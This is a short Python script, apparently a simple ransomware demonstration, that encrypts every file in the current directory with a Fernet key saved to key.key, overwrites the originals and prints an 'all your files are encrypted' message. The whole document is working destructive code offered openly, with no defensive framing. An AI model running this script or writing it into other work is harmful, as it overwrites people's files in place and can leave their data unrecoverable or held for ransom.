import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'encrypt.py' or file == 'key.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)
    #elif os.path.isdir(file):



#print(files)

key = Fernet.generate_key()
with open('key.key', 'wb') as f:
    f.write(key)

for file in files:
    with open(file, 'rb') as f:
        content = f.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, 'wb') as f:
        f.write(content_encrypted)
print('!!!!!!!!!! all your files are encrypted :( !!!!!!!!!!')
